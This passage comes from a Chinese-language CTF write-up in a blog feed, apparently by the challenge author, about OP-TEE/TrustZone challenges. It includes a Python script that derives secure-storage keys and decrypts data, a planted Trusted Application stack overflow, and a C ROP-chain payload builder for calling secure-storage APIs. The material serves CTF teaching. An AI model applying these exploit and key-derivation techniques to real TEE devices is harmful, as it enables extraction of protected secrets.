class="line">FSeek(0x2000);</span><br></pre></td></tr></table></figure><h4 id="Solved"><a href="#Solved" class="headerlink" title="Solved"></a>Solved</h4><p>最后脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> HMAC, SHA256</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#计算ssk</span></span><br><span class="line">    huk = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">16</span></span><br><span class="line">    chip_id = <span class="string">b&#x27;BEEF&#x27;</span> * <span class="number">8</span></span><br><span class="line">    <span class="built_in">print</span>(chip_id)</span><br><span class="line">    ssk_str = <span class="string">b&#x27;ONLY_FOR_tee_fs_ssk\x00&#x27;</span></span><br><span class="line">    m = HMAC.new(huk, digestmod=SHA256)</span><br><span class="line">    m.update(chip_id)</span><br><span class="line">    m.update(ssk_str)</span><br><span class="line">    ssk = m.digest()</span><br><span class="line">    <span class="built_in">print</span>(ssk)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#计算tsk</span></span><br><span class="line">    ta_uuid = <span class="string">b&#x27;\xbb\x50\xe7\xf4\x37\x14\xbf\x4f\x87\x85\x8d\x35\x80\xc3\x49\x94&#x27;</span> <span class="comment">#ta的uuid</span></span><br><span class="line">    m = HMAC.new(ssk, digestmod=SHA256)</span><br><span class="line">    m.update(ta_uuid)</span><br><span class="line">    tsk = m.digest()</span><br><span class="line">    <span class="built_in">print</span>(tsk)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#解fek</span></span><br><span class="line">    enc_fek = <span class="string">b&#x27;\xe4\x9a\x95\xf2\xb5\xf4\x9c\x04\xf6\x07\x9f\xfb\xf0\x2e\xd2\xef&#x27;</span>  <span class="comment">#2在header里</span></span><br><span class="line">    cipher = AES.new(tsk, AES.MODE_ECB)</span><br><span class="line">    fek = cipher.decrypt(enc_fek)</span><br><span class="line">    <span class="built_in">print</span>(fek)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#解数据</span></span><br><span class="line">    enc_data = <span class="string">b&#x27;....&#x27;</span></span><br><span class="line">    iv = <span class="string">b&#x27;\xb4\xc9\x6a\x22\xe6\x36\x72\xcf\x6a\x44\x8f\x10\xa3\x11\x44\x68&#x27;</span> <span class="comment">#对应node</span></span><br><span class="line">    cipher = AES.new(fek, AES.MODE_GCM, nonce=iv)</span><br><span class="line">    data = cipher.decrypt(enc_data)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="UnTrustZone"><a href="#UnTrustZone" class="headerlink" title="UnTrustZone"></a>UnTrustZone</h3><p>题目描述</p><blockquote><p>UntrustZone</p><p>Score: <em>500</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pwn&#96;, &#96;difficulty:normal</span><br></pre></td></tr></table></figure><p>It is clearly not worth your trust.</p><p>The default username is root.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 47.243.205.105 8899</span><br></pre></td></tr></table></figure><p><a href="https://realworldctf-attachment.oss-accelerate.aliyuncs.com/UnstrustZone_d9d2151c29fa340f80f38197492001fe.tar.gz">attachment</a></p></blockquote><h4 id="TL-DR-1"><a href="#TL-DR-1" class="headerlink" title="TL;DR"></a>TL;DR</h4><p>这个题需要补充一些关于 <code>TrustZone</code> 的另外一部分关于 <code>TA</code>和<code>CA</code>的前置知识。 <code>TA</code> 是 Trusted Application 的缩写，通常运行在 TEE 环境下的应用简称为<code> TA</code>。<code>CA</code> 是 Client Application 的缩写，通常运行在 REE 环境下的应用简称为 CA。</p><p>一个访问安全OS的服务流程为：打开 TEE 环境 &gt; 开启一个会话 &gt; 发送命令 &gt; 获取信息 &gt; 结束会话 &gt; 关闭 TEE 环境。</p><p>借助OP-TEE来实现特定安全需求时，一次完整的功能调用一般都是起源于CA，TA做具体功能实现并返回数据到CA，而整个过程需要经过OP-TEE的client端接口，OP-TEE在Linux kernel端的驱动，Monitor模式下的SMC处理，OP-TEE OS的thread处理，OP-TEE中的TA程序运行，OP-TEE端底层库或者硬件资源支持等几个阶段。当TA执行完具体请求之后会按照原路径将得到的数据返回给CA。</p><h4 id="Ideas-1"><a href="#Ideas-1" class="headerlink" title="Ideas"></a>Ideas</h4><p>设计这个题目的时候，就只是想让选手了解下 <code>TA</code> 这个攻击面，所以漏洞设计的得特别简单，就是一个在<code>TA</code>中的栈溢出，我修改了附件中的<code>HUK</code>和签名时候的 key 让他保持于远程的不一致。希望选手通过 Pwn 这个 TA， 来获取 安全存储，即 <code>/data/tee/2</code> 下被加密的 flag 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">data_sz = params[<span class="number">1</span>].memref.size;</span><br><span class="line"><span class="comment">// data = TEE_Malloc(data_sz, 0); patch for challenge</span></span><br><span class="line"><span class="keyword">char</span> data[<span class="number">0x20</span>] ;</span><br><span class="line"><span class="keyword">if</span> (!data)</span><br><span class="line"><span class="keyword">return</span> TEE_ERROR_OUT_OF_MEMORY;</span><br><span class="line">TEE_MemMove(data, params[<span class="number">1</span>].memref.buffer, data_sz);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h5><p>参考： <a href="https://github.com/ForgeRock/optee-build/blob/master/docs/debug.md#debugging-op-tee">optee-build/debug.md at master · ForgeRock/optee-build (github.com)</a></p><ul><li>有 源码调试：</li></ul><p>首先对 ldelf 的入口下断， <code>b thread_enter_user_mode</code></p><p>然后执行 CA 程序，在 LOG 窗口中找到 TA 的加载地址<br><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202112311553854.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202112311553854.png"></a></p><p>然后对 TA 入口下断， <code>b *(baseaddr + TA_InvokeCommandEntryPoint_addr</code></p><ul><li><p>无源码调试</p><p>OP-TEE 有日志功能，在日志功能中能看到 TA 的加载地址，可以通过这个进行调试</p></li></ul><h5 id="内存布局"><a href="#内存布局" class="headerlink" title="内存布局"></a>内存布局</h5><table><thead><tr><th>Text Address</th><th>File Name</th><th>Description</th></tr></thead><tbody><tr><td>0x0</td><td>bl1.elf</td><td>ARM Trusted Firmware Boot Loader Stage 1</td></tr><tr><td>0x1070</td><td>libteec.so</td><td>OP-TEE Client Shared Library [Normal World]</td></tr><tr><td>0x4009c0</td><td><CA></td><td>Client Application [Normal World]</td></tr><tr><td>0xe01b000</td><td>bl2.elf</td><td>ARM Trusted Firmware Boot Loader Stage 2</td></tr><tr><td>0xe040000</td><td>bl31.elf</td><td>ARM Trusted Firmware Boot Loader Stage 3-1</td></tr><tr><td>0xe100000</td><td>tee.elf</td><td>OP-TEE</td></tr><tr><td>0xffff000008081000</td><td>vmlinux</td><td>Linux Kernel [Normal World]</td></tr></tbody></table><ul><li>usermod</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">user mode内存布局</span><br><span class="line">E&#x2F;LD:  region  0: va 0x40004000 pa 0x0e300000 size 0x002000 flags rw-s (ldelf)</span><br><span class="line">E&#x2F;LD:  region  1: va 0x40006000 pa 0x0e302000 size 0x008000 flags r-xs (ldelf)</span><br><span class="line">E&#x2F;LD:  region  2: va 0x4000e000 pa 0x0e30a000 size 0x001000 flags rw-s (ldelf)</span><br><span class="line">E&#x2F;LD:  region  3: va 0x4000f000 pa 0x0e30b000 size 0x004000 flags rw-s (ldelf)</span><br><span class="line">E&#x2F;LD:  region  4: va 0x40013000 pa 0x0e30f000 size 0x001000 flags r--s</span><br><span class="line">E&#x2F;LD:  region  5: va 0x40014000 pa 0x0e32e000 size 0x001000 flags rw-s (stack)</span><br><span class="line">E&#x2F;LD:  region  6: va 0x40015000 pa 0x5f60a888 size 0x001000 flags rw-- (param)</span><br><span class="line">E&#x2F;LD:  region  7: va 0x4004d000 pa 0x00001000 size 0x012000 flags r-xs [0]</span><br><span class="line"> &#x2F;&#x2F;随机 </span><br><span class="line">E&#x2F;LD:  region  8: va 0x4005f000 pa 0x00013000 size 0x00c000 flags rw-s [0]</span><br><span class="line"> &#x2F;&#x2F;随机</span><br></pre></td></tr></table></figure><p>一般而言： ldelf  加载地址是固定的， 处理代码位于 <code> build/optee*os/core/arch/arm/kernel/ldelf_loader.c</code></p><p><code>ldelf_load_ldelf</code> 函数中， 最后加载的base为  0x40006000, 具体代码可见<code>build/optee_os/core/arch/arm/kernel/ldelf_loader.c</code></p><h4 id="Solved-1"><a href="#Solved-1" class="headerlink" title="Solved"></a>Solved</h4><p>解题关键是需要了解没法直接解密的时候，我们应该如何读取 flag：</p><ol><li>TEE_AllocatePersistentObjectEnumerator</li><li>TEE_GetNextPersistentObject</li><li>TEE_OpenPersistentObject</li><li>TEE_ReadObjectData</li><li>memcpy data to buffer</li></ol><p>首先， <code>ldefl</code> 加载基地址是不变的，我们可以在这上边找 gadget ， 另外虽然 <code>TA</code>有随机化，但是这随机化并不是很高，可以通过爆破解决。所以 <code>TA</code> 的程序也是找 gadget 的目标之一。ldefl 程序的代码段是被通过 <code>ldelf_load_ldelf</code> 函数是写死在 <code>bl32_extra1.bin</code>中的。</p><p>最后我们找到的了几个可以设置 5 个参数的 gadget。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">CallFun5</span><span class="params">(TEEC_Session* sess,<span class="keyword">uint64_t</span> func,<span class="keyword">uint64_t</span> x0,<span class="keyword">uint64_t</span> x1,<span class="keyword">uint64_t</span> x2,<span class="keyword">uint64_t</span> x3,<span class="keyword">uint64_t</span> x4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//存放返回内存的地址在：g_ta_addr+124D8</span></span><br><span class="line"><span class="comment">//返回地址0x00000000400152b0</span></span><br><span class="line">payload = (<span class="keyword">uint8_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">memset</span>(payload,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(payload,tmp,<span class="keyword">sizeof</span>(tmp));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;tmplen 0x%lx \n&quot;</span>,<span class="keyword">sizeof</span>(tmp));</span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">48</span>) = <span class="number">0x40015150</span>;  <span class="comment">//next x19</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">56</span>) = <span class="number">0x40004008</span>;  <span class="comment">//next x20</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">40</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000003a28</span>; <span class="comment">//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">672</span>) = x1 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>; <span class="comment">//next x1  [x19+0x10]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//x1 == [x19+0x10]</span></span><br><span class="line"><span class="comment">//0x0000000000003a28: ldr x1, [x19, #0x10]; add x0, x0, x1; str x0, [x20]; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x40; ret;</span></span><br><span class="line">*(<span class="keyword">uint32_t</span>*)(payload+<span class="number">108</span>) = <span class="number">0x40015777</span>; <span class="comment">//next 19</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">112</span>) = <span class="number">0x40014ff8</span>; <span class="comment">//next 20</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">64</span>) = <span class="number">0x40004010</span>; <span class="comment">//next x21</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">184</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000000C40</span>; <span class="comment">//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">344</span>) = x2; <span class="comment">//next x2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//x2 = [SP,#0x70+va]</span></span><br><span class="line"><span class="comment">//0x0000000000000C40 E2 37 40 F9                                   LDR             X2, [SP,#0x70+va]</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">112</span>+<span class="number">0x38</span>) = <span class="number">0x40015150</span>; <span class="comment">//next x19</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">272</span>) = <span class="number">0x40004070</span>; <span class="comment">//next x21</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">304</span>) = <span class="number">0</span>; <span class="comment">//next x25</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">160</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000000EE0</span>; <span class="comment">//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">672</span>+<span class="number">8</span>) = x0; <span class="comment">//next x0 [x19 + 0x18]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//x0 = [x19 + 0x18]</span></span><br><span class="line"><span class="comment">//text:0000000000000EE0 60 0E 40 F9                                   LDR             X0, [elf,#0x18] </span></span><br><span class="line"><span class="comment">//*(uint64_t*)(payload+360) = 0x40006000+0x000000000000064C;//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">432</span>) = x1; <span class="comment">//next x27</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">440</span>) = x3; <span class="comment">//next x28</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">360</span>) = g_ta_addr+<span class="number">0x000000000000aa00</span>;<span class="comment">//next pc</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//x3 == x28  x1 == x27</span></span><br><span class="line"><span class="comment">//0x000000000000aa00 : mov x3, x28 ; csel x21, x21, x2, ne ; mov x1, x27 ; mov x2, x21 ; str x24, [sp, #0x78] ; blr x23</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">400</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000001f98</span>;<span class="comment">//next x23 next pc</span></span><br><span class="line"><span class="comment">//x21 == [sp, #0x20]</span></span><br><span class="line"><span class="comment">//0x0000000000001f98 : ldp x21, x22, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">376</span>) = <span class="number">0x40015170</span>; <span class="comment">//next x20</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">496</span>) = <span class="number">0x40015180</span>; <span class="comment">//next x21</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">472</span>) = g_ta_addr + <span class="number">0x0000000000005fa4</span>; <span class="comment">//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">696</span>) = x4; <span class="comment">//next x4 == [x20, #8]</span></span><br><span class="line"><span class="comment">//x4 == [x20, #8]</span></span><br><span class="line"><span class="comment">//x1 == [x21, #8]</span></span><br><span class="line"><span class="comment">//0x0000000000005fa4 : ldr x4, [x20, #8] ; ldr x0, [x21, #8] ; cmp x4, x0 ; b.hi #0x5fc8 ; mov w0, w9 ; ldp x19, x20, [sp, #0x10] ; ldr x21, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">528</span>) = <span class="number">0x40015180</span>; <span class="comment">//next x19</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">544</span>) = <span class="number">0x40004070</span>; <span class="comment">//next x21</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">416</span>) = <span class="number">0xFFFFFFFFFFFFF001</span>; <span class="comment">//next x25</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">520</span>) = <span class="number">0x40006000</span>+<span class="number">0x0000000000000EE0</span>; <span class="comment">//next pc</span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">728</span>) = x0; <span class="comment">//next x0 [x19 + 0x18]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//text:0000000000000EE0 60 0E 40 F9                                   LDR             X0, [elf,#0x18] </span></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(payload+<span class="number">568</span>) = func;<span class="comment">//0x40006000+0x000000000000064C;//next pc</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.daimajiaoliu.com/daima/4872449c3100404">OP-TEE中secure stroage——安全存储使用的key的产生 (daimajiaoliu.com)</a></p><p><a href="https://optee.readthedocs.io/en/latest/">OP-TEE Documentation — OP-TEE documentation documentation (optee.readthedocs.io)</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; hr</summary>
      
    
    
    
    <category term="Writeup" scheme="https://bestwing.me/categories/Writeup/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
  </entry>
  
</feed>
